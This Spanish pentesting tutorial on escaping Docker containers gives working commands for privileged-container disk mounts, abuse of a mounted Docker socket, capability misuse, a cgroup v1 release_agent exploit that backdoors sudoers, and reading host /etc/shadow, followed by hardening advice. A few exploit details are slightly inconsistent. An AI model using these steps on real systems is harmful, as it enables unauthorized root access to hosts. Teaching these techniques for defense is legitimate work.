---
layout: single
title: "Docker Container Escape: Técnicas de Breakout en Entornos Containerizados"
date: 2026-08-04
categories: [tutoriales]
tags: [docker, container, escape, breakout, linux, namespaces, capabilities, cgroups, pentesting, privesc]
excerpt: "Namespaces, cgroups y capabilities: los tres pilares del aislamiento de containers Docker y cómo cada uno puede romperse para escapar al host."
permalink: /tutoriales/docker-container-escape/
---

Un container Docker no es una VM. No hay hipervisor, no hay kernel separado: el proceso dentro del container comparte el kernel del host y solo está aislado mediante namespaces, cgroups y capabilities. Cuando ese aislamiento está mal configurado, escapar al host es cuestión de minutos.

Este post cubre las técnicas de breakout más relevantes que se encuentran en auditorías reales: container privilegiado, socket de Docker expuesto, capabilities peligrosas y el escape mediante cgroup v1.

---

## Modelo de aislamiento de Docker

Antes de explotar algo conviene entender qué protege:

| Mecanismo | Función |
|---|---|
| **Namespaces** | Aislan PID, red, montajes, IPC, UTS, usuario. El proceso ve un subconjunto del sistema |
| **cgroups** | Limitan recursos (CPU, RAM, I/O). En v1, también notifican eventos de procesos |
| **Capabilities** | Fragmentan los privilegios de root en ~40 unidades independientes |
| **Seccomp** | Filtra syscalls permitidas al container |
| **AppArmor/SELinux** | Perfil MAC adicional por container |

El vector de escape casi siempre implica romper uno de los primeros tres.

---

## Técnica 1: Container privilegiado (`--privileged`)

Un container lanzado con `--privileged` recibe todas las capabilities y puede montar cualquier dispositivo del host. Es el misconfiguration más grave.

### Detección desde dentro del container

```bash
# Si devuelve 0, el container tiene todas las capabilities
cat /proc/self/status | grep CapEff
# CapEff: 000001ffffffffff  <- todas habilitadas

# Alternativa con capsh
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')
```

### Escape: montar el disco del host

```bash
# Identificar el dispositivo raíz del host
fdisk -l

# Montar en el container
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Ahora tienes acceso completo al filesystem del host
chroot /mnt/host
```

### Escape alternativo: escribir en /proc/sysrq-trigger

En containers privilegiados `/proc/sysrq-trigger` es accesible y permite ejecutar comandos kernel como crash o remount. Menos útil para escape directo pero relevante para DoS.

---

## Técnica 2: Docker socket montado (`/var/run/docker.sock`)

Si el container tiene montado el socket del daemon Docker, puede crear nuevos containers con acceso total al host. Patrón frecuente en pipelines CI/CD mal configurados.

```bash
# Comprobar si el socket está disponible
ls -la /var/run/docker.sock
```

### Escape via API REST del socket

```bash
# Crear un container nuevo montando / del host
curl -s --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["chroot", "/host", "bash", "-c", "id; whoami"],
    "Binds": ["/:/host:rw"],
    "HostConfig": {"Binds": ["/:/host:rw"]}
  }' \
  http://localhost/containers/create

# Iniciar el container recién creado
curl -s --unix-socket /var/run/docker.sock \
  -X POST \
  http://localhost/containers/<container_id>/start

# Obtener la salida
curl -s --unix-socket /var/run/docker.sock \
  http://localhost/containers/<container_id>/logs?stdout=1
```

Si el entorno tiene `docker` CLI disponible es más directo:

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
```

---

## Técnica 3: Capabilities peligrosas

No es necesario `--privileged` completo. Algunas capabilities individuales son suficientes para escapar.

### CAP_SYS_ADMIN

La capability más potente. Permite montar filesystems, manipular namespaces, escribir en `/proc`:

```bash
# Comprobar si la tenemos
cat /proc/self/status | grep CapEff | xargs capsh --decode=

# Con CAP_SYS_ADMIN se puede hacer un bind mount del host
mount --bind /proc/sysrq-trigger /proc/sysrq-trigger

# O crear un user namespace y escalar desde ahí
unshare -Urm bash
```

### CAP_NET_ADMIN

Permite modificar rutas, crear interfaces de red y hacer sniffing. No escapa directamente, pero en redes Docker bridge puede comprometer tráfico de otros containers:

```bash
# Poner la interfaz en modo promiscuo
ip link set eth0 promisc on
tcpdump -i eth0 -w /tmp/cap.pcap
```

### CAP_DAC_READ_SEARCH

Ignora los permisos de lectura en todo el sistema de ficheros del namespace. Con `open_by_handle_at` se puede leer ficheros del host si se puede construir un handle válido (técnica usada por Shocker exploit):

```c
// Concepto básico de Shocker
// Requiere CAP_DAC_READ_SEARCH
int dirfd = open("/", O_RDONLY);
struct file_handle *fhp = malloc(sizeof(struct file_handle) + MAX_HANDLE_SZ);
fhp->handle_bytes = MAX_HANDLE_SZ;
name_to_handle_at(dirfd, "etc/shadow", fhp, &mount_id, 0);
int fd = open_by_handle_at(AT_FDCWD, fhp, O_RDONLY);
```

---

## Técnica 4: Escape mediante cgroup v1 release_agent

CVE-2022-0492 popularizó este vector, pero la técnica base existe desde mucho antes. En cgroup v1, el fichero `release_agent` contiene un path ejecutado como root en el host cuando el último proceso de un cgroup muere. Si el container puede escribir en ese fichero, tiene ejecución en el host.

Requiere: acceso a la jerarquía de cgroup v1 (frecuente en sistemas con kernel < 5.14 o sin `cgroupns`).

```bash
# Comprobar si cgroup v1 está accesible
mount | grep cgroup
# Si aparece "cgroup" sin "cgroup2", estamos en v1

# Encontrar un cgroup montado con permisos de escritura
find /sys/fs/cgroup -maxdepth 3 -name release_agent -writable 2>/dev/null
```

### Exploit paso a paso

```bash
# Crear un subdirectorio de cgroup
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Habilitar release_agent
echo 1 > /tmp/cgrp/x/notify_on_release

# Resolver el path real del container dentro del host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Escribir el payload a ejecutar en el host
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Payload: reverse shell o escritura de clave SSH
cat > /cmd << 'EOF'
#!/bin/sh
echo "root ALL=(ALL) NOPASSWD:ALL" >> /host_etc/sudoers
EOF
chmod +x /cmd

# Disparar la ejecución: crear y matar un proceso en el cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" && sleep 1
```

---

## Técnica 5: Escape via `/proc/[pid]/root` del host

Si hay un proceso del host visible desde el container (por namespace PID compartido o montaje de `/proc` del host), se puede acceder a su raíz:

```bash
# Listar procesos del host (solo si se comparte PID namespace)
ls /proc/ | grep -E '^[0-9]+$'

# Acceder al filesystem del host a través del proceso 1
ls /proc/1/root/etc/
cat /proc/1/root/etc/shadow
```

---

## Detección y hardening

| Técnica | Mitigación |
|---|---|
| `--privileged` | Nunca en producción. Usar capabilities específicas |
| Docker socket | No montar `/var/run/docker.sock` en containers. Usar rootless Docker o socket proxies |
| `CAP_SYS_ADMIN` | Eliminar con `--cap-drop=ALL --cap-add=<solo_las_necesarias>` |
| cgroup v1 | Migrar a cgroup v2 (`systemd.unified_cgroup_hierarchy=1`), usar seccomp/AppArmor |
| PID namespace compartido | No usar `--pid=host` salvo necesidad justificada |

Para auditar un container en producción:

```bash
# Desde fuera: inspeccionar la configuración
docker inspect <container> | jq '.[0].HostConfig | {Privileged, CapAdd, CapDrop, Binds, PidMode}'

# Desde dentro: script de enumeración rápida
cat /proc/self/status | grep -E '^Cap'
ls -la /var/run/docker.sock 2>/dev/null
mount | grep -E '(cgroup|/host)'
env | grep -E '(DOCKER|KUBE)'
```

Herramientas de auditoría automatizada: [deepce](https://github.com/stealthcopter/deepce), [amicontained](https://github.com/genuinetools/amicontained), `docker bench security`.

---

## Referencias

- Felix Wilhelm — *Abusing Privileged and Unprivileged Linux Containers* (NCC Group, 2016)
- Trail of Bits — *Understanding and Hardening Linux Containers* (2016)
- CVE-2022-0492 — Linux kernel cgroup v1 privilege escalation
- Paloalto Unit 42 — *Escaping Docker containers using fileHandle* (2019)
- [OWASP Container Security Top 10](https://owasp.org/www-project-docker-top-10/)
